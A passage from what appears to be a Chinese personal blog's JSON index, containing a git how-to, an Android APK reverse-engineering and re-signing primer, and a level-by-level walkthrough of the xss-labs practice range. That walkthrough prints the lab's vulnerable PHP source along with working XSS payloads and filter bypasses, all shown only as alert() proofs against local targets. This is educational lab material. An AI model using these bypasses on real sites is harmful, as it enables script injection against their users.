self.driver.switch_to.window(self.vars[&quot;win8089&quot;])","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"git使用","slug":"git使用","date":"2019-11-21T03:13:01.000Z","updated":"2021-07-03T15:32:18.059Z","comments":true,"path":"2019/11/21/git使用/","link":"","permalink":"http://yejuns.github.io/2019/11/21/git%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装Linux 上安装 sudo dnf install git-all # centos上 sudo apt install git-all # ubuntu上 简单使用12345678910git下载后， 要先配置用户名和密码git config --global user.name &#39;yejuns&#39;git config --global user.email &#39;18756561540@163.com&#39;git config -l 列出所有配置git init 初始化本地git项目git remote add origin https:&#x2F;&#x2F;github.com&#x2F;yejuns&#x2F;myNote.git 将本地git项目与远程仓库的项目进行关联git status 查看本地git项目内的变化git add *git commit -m &#39;first commit&#39; 本地修改生效git push -u origin master 向远端推送 windows 上安装官方版本可以在 Git 官方网站下载。 打开 https://git-scm.com/download/win，下载安装版即可 常见问题 Failed to connect to github.com port 443: Timed out首先要确认自己能否正常使用ssh，在终端输入 123$ ssh -T -p 443 git@ssh.github.com&gt; Hi username! You&#x27;ve successfully authenticated, but GitHub does not&gt; provide shell access. 如果显示如上面所示，那就证明SSH是没有问题的，检测一下自己的本地ssh公钥和私钥，然后去看一下github上的配置（但一般也是没有问题的） 可以尝试在自己系统的hosts文件（windows的路径是C:\\Windows\\System32\\drivers\\etc\\hosts,linux的路径是/etc/hosts）中添加github的地址，从而避免DNS解析问题。需要访问https://github.com.ipaddress.com/，从网页中查看相关地址，记录下来同样地，还需要访问https://fastly.net.ipaddress.com/github.global.ssl.fastly.net#ipinfo 和 https://github.com.ipaddress.com/assets-cdn.github.com，并记录相应的ip地址，最后添加如下信息 123456140.82.113.4(第一个网站IP Address) github.com 199.232.69.194(第二个网站的IP Address) github.global.ssl.fastly.net185.199.108.153(第三个网站的IP Address) assets-cdn.github.com185.199.109.153(第三个网站的IP Address) assets-cdn.github.com185.199.110.153(第三个网站的IP Address) assets-cdn.github.com185.199.111.153(第三个网站的IP Address) assets-cdn.github.com 也有说配置全局代理生效的，不过我这边没有成功。","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"xss-lab-master靶场题解思路","slug":"xss-lab-master-靶场题解思路","date":"2019-10-31T08:01:51.000Z","updated":"2021-07-03T09:24:02.533Z","comments":true,"path":"2019/10/31/xss-lab-master-靶场题解思路/","link":"","permalink":"http://yejuns.github.io/2019/10/31/xss-lab-master-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AF/","excerpt":"","text":"XSS靶场训练这里我们选择的是xss-lab-master靶场，可以直接下载docker镜像，在本地运行。 level 1当前页面没有任何的提示信息，从URL中可以猜测是通过参数name直接注入 注入语句 1http://127.0.0.1/level1.php?name=&lt;script&gt;alert(12)&lt;/script&gt; 后台源码 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; level 2当前页面只有一个文本框，先在文本框中输入&lt;script&gt;alert(12)&lt;/script&gt;, 发现没有效果。可能是对输入进行了转义。但由于输入框并不会对输入的语句清空，因此我们可以尝试闭合&lt;input&gt;标签 注入语句 1http://127.0.0.1/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; level 3尝试使用level 2的语句注入，发现不能成功。那可能是对文本框内的内容也进行了转义，尝试通过事件标签触发表单执行注入语句 1http://127.0.0.1/level3.php?keyword=&#x27;οnmοuseοver=&#x27;alert(&#x27;xss&#x27;) 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 从源码中可以看到，因为是在标签内部，所以可以使用属性注入，常用的属性 level 4先用测试语句&#39;&#39;;!--&quot;&lt;xss&gt;=&amp;&#123;()&#125;看看有没有过滤，然后先看看源码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1level4.php?keyword=&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&quot; 伪协议后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于对script、on都进行了处理，因此使用javascript伪协议以及标签进行注入，javascript伪协议：在此 1http://127.0.0.1/level4.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;xss&quot; 伪协议123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1http://127.0.0.1/level5.php?keyword=&quot;οnmοuseοver=&#x27;alert(12)&#x27;&quot; 大小写绕过后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 从代码中可以看出对一些关键词都进行了替换，但是好在没有对大写字母进行修改，因此可以使用单引号闭合，加大小写的脚本或者标签方法注入。 1http://127.0.0.1/level6.php?keyword=&quot;&gt;&lt;scRipt&gt;alert(/xss/)&lt;/scRipt&gt; 双写绕过123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 它把特殊语义的字符串修改成了空字符串，我们就可以使用双写的方法进行注入。 1http://127.0.0.1/level7.php?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; 字符实体后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于会被htmlspecialchars函数转义，所以可将所有字符编码为HTML实体，从而绕过。 HTML实体 HTML编码转换 在文本框输入javasc&amp;#114;ipt:alert(/xss/) 检测关键字存在后台代码 1234567891011121314151617181920212223242526&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt; 这里的strpos函数是用来查找指定文本在字符串中第一次出现的位置，这时候我们就不得不在代码里加入http://，但是并没有过滤HTML实体编码，所以还是使用编码绕过 使用过滤HTML实体编码，但是由于需要加入http://，肯定不能在http://后面加代码，必须在前面，并且将http://注释掉才能执行 在文本框输入javasc&amp;#114;ipt:alert(/xss/)//http:// 检测关键字存在先测试一下最基本的xss注入，&lt;script&gt;alert(123)&lt;/acript&gt;,发现没有效果 看网页发现不了关键信息，就查看网页源代码可以发现有一个隐藏的表单,其中含有t_link t_history t_sort这样三个隐藏的&lt;input&gt;标签 构造语句，查看哪个标签可以被突破 1?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&quot;&amp;t_history=&quot; type=&quot;text&quot;&quot;&amp;t_sort=&quot; type=&quot;text&quot;&quot; 可以发现name为t_sort的&lt;input&gt;标签被改变，于是进行尝试对这个标签注入，构造如下代码 12?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)# 注意这里由于没有文本框，需要在将&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;这行的type值改成text 注入成功 后台代码： 1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; Referer信息跟上面的很相似，所以用上面的注入代码尝试一下，发现没有成功，查看网页源代码，可以发现双引号被转义。没有办法，先查看源码，可以发现对str11的过滤并不是很严谨 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以通过抓包工具进行抓包，然后修改里面的referer字段referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;) 最后注入成功 user-agent信息和上题一样的思路，只是将注入点改成UA Cookie信息和上题一样的思路，只是将注入点改成Cookie字段上。 exif xss没做出来，然后百度发现说这种情况很少 ng-include属性第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看源码，可以发现我们输入的值被传入&lt;span&gt;标签的class属性中，同时&lt;,&gt;,&#39;被转义&lt;span&gt;标签前面还有ng-include这样的字符。 ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将后面输入的文件给包含进来。 因此，我们的注入方法是 利用ng-include指令的特性包含一个有漏洞的html文件，注意这里有对尖括号的过滤。 构造如下代码进行注入 1?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; 这里参数值算是一个地址，所以需要添加引号。因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的 html文件给包含进来的意思。 空格==回车第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码，可以发现关键字script以及 / 和空格都被编码成同样的空格字符实体. 查看源代码 123456789&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt; 空格、反斜杠、script都被str_replace函数替换成&amp;nbsp,所以我们考虑用空格来将它们分开，从而避免被替换。而%0a或者%0D当成空格使用，在HTML中这样是合法的 注入语句：http://192.168.226.128/xss-labs-master/level16.php?keyword=&lt;a%0Ahref=&#39;javas%0Acript:alert(&quot;xss&quot;)&#39;&gt;xss 合二为一在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码,可以发现提交的两个参数的值出现在了标签的src属性值中，同时构造的代码中关键字都被编码。 仔细观察一下，发现&lt;embed&gt;标签就是引入一个swf文件到浏览器端，并且它的src属性值没有添加引号，所以不用闭合 注入语句： 12http://192.168.111.138/xss-labs-master/level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)#注意在arg01这里要添加空格，不然就是将属性与之前的xsf01.swf?进行连接了 level 18思路与上面的类似，只是换了一张不同的图片。注入语句： 1http://192.168.111.138/xss-labs-master/level18.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/) level 19level 20这两题都很类似，先看网页源代码。src的值使用双引号括起来的，如果想要成功执行js代码肯定需要去闭合标签，但是此处会用htmlspecialchars()函数进行处理，所以无法成功闭合,这就涉及一种xss攻击手段叫做flash xss,具体以后再研究","categories":[],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Android逆向 一 基础知识","slug":"Android逆向第一课","date":"2018-06-21T11:01:51.000Z","updated":"2021-07-10T05:18:33.828Z","comments":true,"path":"2018/06/21/Android逆向第一课/","link":"","permalink":"http://yejuns.github.io/2018/06/21/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%80%E8%AF%BE/","excerpt":"","text":"最近自己在学习Android的逆向，把学习的过程记录一下，方便新手入门 1、预备工具JAVA环境： 官方下载安装地址: https://www.oracle.com/technetwork/java/javase/downloads/index.html （现在android开发还是用Java比较多，虽然google在推广Kotlin） apktool： https://ibotpeaches.github.io/Apktool/ 是apktool.jar 要安装Java环境才能运行 JADX： https://www.softpedia.com/get/Programming/Other-Programming-Files/Jadx.shtml .exe文件，目录里可以直接双击运行 Java SDK自带：keytool（证书工具）、jarsigner（签名工具） 2、基础知识JAVA源代码文件是XXX.java,JAVA是编译性语言，编译后才能运行，编译后的文件是XXX.class （class文件是可执行文件，jar包里就是.class文件），JAVA虚拟机运行的就是XXX.class文件 安卓虚拟机下面是运行的是xxx.dex，dex是安卓里可执行文件（.dex文件是安卓环境下运行的可执行文件） .smali文件是将.dex文件反编译得到的文件，具有特定的语法格式（因为android系统使用自己的dalvik虚拟机，代码最终编译后生成的是.dex文件） Android程序的安装包是一个APK文件，APK是一个压缩文件，用zip压缩解压，解压后的主要文件有： assets：资源文件(图片，网页，视频)，不会被编译。 res：资源文件（静态文本，图片，关键资源） 会被编译。 lib：.so库，系统库，自己打包的库。有的把加密/token生成方式放在.so文件里 META-INF：签名信息。 AndroidManifest.xml：配置信息（关键），举例修改权限；同时定义了一些程序入口 classes.dex：android dalvik虚拟机可执行文件 resources.arsc：资源索引/对应文件 3、apktool使用apktool d test.apk 反编译test.apk包（d: decode） apktool b test 将反编译后的文件重新打包(b:build) 使用zip对APK解压后，会发现各个文件是乱码，无法去读 使用apktool反编译后，才可以去正常地读取信息 使用apktool反编译后，我们就可以得到关于应用的.smali文件,对smali文件进行修改，然后就可以重新打包成新的应用。 关于class、dex、smali文件之间的转换，可以看下图 为什么不将整个应用之间完全反编译为java文件，这样可读性更好？因为我们并不知道APP在编译时的java版本、各种环境，直接将修改反编译后的class文件，很容易出现重新构建的APP无法运行的情况。因此对编译后的smali文件进行修改后，打包后就可以直接运行。 4、jadx使用jadx是一款反编译利器，同时支持命令行和图形界面，能以最简便的方式完成apk的反编译操作, 实现 .dex -&gt; .java 双击jadx-gui就可以打开图形界面，选择一个APK打开，很快就会解析出相应的结果 jadx提供了强大的搜索功能，通过Navigation -&gt; Text Search进行搜索，jadx的搜索，支持四种维度，Class、Method、Field、Code，我们可以根据我们搜索的内容进行勾选，范围最大的就是 Code ，基本上就是文本匹配搜索。 jadx还提供了改名（deobfuscation）的功能，这样可以方便我们进行搜索 jadx-gui 虽然可以直接阅读代码，但是毕竟没有我们常见的编辑器来的方便。我们可以将反编译后的项目直接导出成一个 Gradle 编译的工程（File -&gt; Save as gradle project），然后用Android studio打开这个项目，方便代码的阅读。 5、签名签名的作用是 - 确保Apk来源的真实性，确保Apk没有被第三方篡改。相当于在Apk中写入一个“指纹”。指纹写入以后，Apk中有任何修改，都会导致这个指纹无效，Android系统在安装Apk进行签名校验时就会不通过，从而保证了安全性。 未签名APK不能在安卓手机上安装 签名的过程： 通过Hash算法提取出原始数据的摘要； 通过基于密钥（私钥）的非对称加密算法对提取出的摘要进行加密，加密后的数据就是签名信息； 将签名信息写入原始数据的签名区块内; Android提供了两种对Apk的签名方式，一种是基于JAR的签名方式，另一种是基于Apk的签名方式，它们的主要区别在于使用的签名文件不一样：jarsigner使用keystore文件进行签名；apksigner除了支持使用keystore文件进行签名外，还支持直接指定pem证书文件和私钥进行签名。 keytool jarsigner 是JAVA JDK自带的 1234# 生成证书keytool -genkey -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 4096 -validity 10000# 用证书给apk签名jarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore -signedjar com.dahuodong.veryevent_4.6.2_60_sign.apk com.dahuodong.veryevent_4.6.2_60.apk my_alias","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]}],"categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","permalink":"http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Linux安全","slug":"Linux安全","permalink":"http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"},{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"},{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"windows","slug":"windows","permalink":"http://yejuns.github.io/tags/windows/"},{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"},{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"},{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]}